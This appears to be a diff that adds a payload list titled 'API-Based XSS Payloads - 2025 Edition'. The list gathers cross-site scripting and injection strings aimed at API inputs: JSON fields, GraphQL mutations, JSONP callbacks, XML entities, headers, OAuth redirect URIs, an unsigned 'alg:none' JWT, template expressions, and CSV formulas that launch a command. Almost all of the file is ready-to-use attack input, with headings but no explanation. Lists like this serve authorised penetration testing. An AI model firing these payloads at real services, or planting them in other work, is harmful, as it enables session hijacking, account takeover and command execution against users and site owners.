@@ -1,0 +1,164 @@
+# API-Based XSS Payloads - 2025 Edition
+
+# JSON Injection Payloads
+{"key":"<img src=x onerror=alert(1)>"}
+{"key":"</script><script>alert(1)</script>"}
+{"key":"</script><img src=x onerror=alert(1)>"}
+{"key":"javascript:alert(1)"}
+{"key":"'onclick='alert(1)'"}
+{"key":"\"onclick=\"alert(1)\""}
+{"html":"<img src=x onerror=alert(1)>"}
+{"html":"<script>alert(1)</script>"}
+{"data":{"html":"<img src=x onerror=alert(1)>"}}
+{"data":{"html":"<script>alert(1)</script>"}}
+
+# GraphQL Injection
+mutation {
+  createPost(title: "<script>alert(1)</script>", content: "test")
+}
+
+mutation {
+  createUser(name: "<img src=x onerror=alert(1)>", email: "test@example.com")
+}
+
+query {
+  user(id: "1</script><script>alert(1)</script>") {
+    name
+  }
+}
+
+# REST API Payloads
+POST /api/comments
+{"author":"<script>alert(1)</script>","text":"test"}
+
+PUT /api/profile
+{"name":"<img src=x onerror=alert(1)>","bio":"test"}
+
+PATCH /api/settings
+{"theme":"</script><script>alert(1)</script>"}
+
+# JSONP Injection
+callback=alert(1)//
+callback=alert;
+jsonp=alert(1)//
+jsonp=alert;
+callback=<script>alert(1)</script>
+callback=</script><script>alert(1)</script>
+callback=function(){alert(1)}//
+
+# XML Injection for APIs
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "javascript:alert(1)">
+]>
+<data>&xxe;</data>
+
+<?xml version="1.0"?>
+<user>
+  <name><![CDATA[<script>alert(1)</script>]]></name>
+  <email>test@example.com</email>
+</user>
+
+<?xml version="1.0"?>
+<svg onload="alert(1)"></svg>
+
+# YAML Injection
+name: !!js/function 'function(){alert(1)}'
+description: <script>alert(1)</script>
+
+# CSV Injection
+=cmd|' /C calc'!A1
+=hyperlink("javascript:alert(1)")
+@=2+5+cmd|' /C calc'!A0
+
+# API Parameter Pollution
+?id=1&id=<script>alert(1)</script>
+?name=test&name=<img src=x onerror=alert(1)>
+?q=normal&q=<script>alert(1)</script>
+
+# API Header Injection
+X-Forwarded-Host: <script>alert(1)</script>
+Referer: <script>alert(1)</script>
+User-Agent: <script>alert(1)</script>
+Cookie: session=<script>alert(1)</script>
+Origin: <script>alert(1)</script>
+
+# OAuth Redirect XSS
+/oauth/callback?redirect_uri=javascript:alert(1)
+/oauth/callback?state=</script><script>alert(1)</script>
+/oauth/authorize?client_id=123&redirect_uri=javascript:alert(document.domain)
+
+# JWT Payload Injection
+# Base64 encoded: {"alg":"none","typ":"JWT"}.{"user":"<script>alert(1)</script>"}
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiJ9.
+
+# WebSocket Payload Injection
+{"message":"<img src=x onerror=alert(1)>"}
+{"action":"update","data":"<script>alert(1)</script>"}
+{"type":"message","content":"</script><script>alert(1)</script>"}
+
+# Server-Sent Events Injection
+data: <script>alert(1)</script>
+
+data: {"content":"<img src=x onerror=alert(1)>"}
+
+# API Response Injection Vectors
+{"html":"<script>alert(1)</script>"}
+{"message":"<img src=x onerror=alert(1)>"}
+{"error":"<script>alert(1)</script>"}
+{"redirect":"javascript:alert(1)"}
+{"url":"javascript:alert(1)"}
+
+# GraphQL Variables Injection
+{
+  "variables": {
+    "name": "<script>alert(1)</script>"
+  },
+  "query": "mutation ($name: String!) { createUser(name: $name) { id } }"
+}
+
+# API File Upload XSS
+filename=""><script>alert(1)</script>.jpg"
+Content-Disposition: form-data; name="file"; filename="xss.svg"
+Content-Type: image/svg+xml
+
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+
+# API Documentation XSS
+/api/docs?module=<script>alert(1)</script>
+/swagger-ui.html#/<script>alert(1)</script>
+
+# API Version XSS
+/api/<script>alert(1)</script>/users
+/v<script>alert(1)</script>/resources
+
+# API Key XSS
+/api/data?key=<script>alert(1)</script>
+/api/data?api_key=</script><script>alert(1)</script>
+
+# API Path Traversal + XSS
+/api/files/../../../<script>alert(1)</script>
+/api/proxy/https://evil.com/<script>alert(1)</script>
+
+# API Batch Request XSS
+[
+  {"method": "GET", "path": "/users/<script>alert(1)</script>"},
+  {"method": "POST", "path": "/comments", "body": {"text": "<img src=x onerror=alert(1)>"}}
+]
+
+# API Webhook XSS
+{
+  "webhook_url": "javascript:alert(1)",
+  "events": ["user.created"]
+}
+
+# API Template Injection
+{"template": "{{constructor.constructor('alert(1)')()}}"}
+{"template": "${alert(1)}"}
+{"template": "<%= alert(1) %>"}
+{"template": "#{alert(1)}"}
+{"template": "{{alert(1)}}"}
+{"template": "{{{alert(1)}}}"}
+
+# API Content-Type XSS
+Content-Type: text/html; charset=">&lt;script&gt;alert(1)&lt;/script&gt;"
